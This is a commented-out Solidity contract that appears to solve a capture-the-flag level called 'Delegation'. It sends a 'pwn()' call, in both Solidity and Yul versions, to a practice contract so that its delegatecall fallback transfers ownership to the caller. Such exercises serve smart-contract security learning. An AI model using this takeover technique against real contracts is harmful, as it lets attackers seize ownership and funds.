// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// interface Delegate {
//     function pwn() external;
// }

// interface Delegation {}

// contract DelegationHack {
//     Delegation _delegate;

//     constructor(address chal) {
//         _delegate = Delegation(chal);
//     }

//     function SolidityBuild() public payable {
//         bytes memory call_pwn = abi.encodeWithSignature("pwn()");
//         address(_delegate).call{value: msg.value}(call_pwn);
//     }

//     function YulBuild() public {
//         assembly {
//             mstore(0, "pwn()")
//             mstore(0, keccak256(0, 5))
//             let success := call(gas(), sload(0), 0, 0, 4, 0, 0)
//             if iszero(success) {
//                 revert(0, 0)
//             }
//         }
//     }
// }
